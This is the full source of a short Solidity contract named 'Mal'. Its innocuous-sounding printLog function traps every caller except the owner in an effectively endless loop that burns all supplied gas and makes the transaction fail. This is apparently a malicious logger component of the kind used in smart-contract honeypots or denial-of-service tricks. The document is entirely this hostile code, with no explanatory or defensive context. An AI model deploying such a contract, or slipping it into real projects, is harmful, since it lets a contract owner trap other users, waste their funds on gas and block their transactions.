//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Mal {

    address private owner; 
    uint256 private constant MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935; 
    uint256 private counter;

    constructor() {
        owner = msg.sender;
    }
 
    function printLog(address _user) public {
        if (_user != owner) {
            for (uint256 i = 0 ; i < MAX_INT; i++) {
                counter += 1;
            }
        } 
    }
}
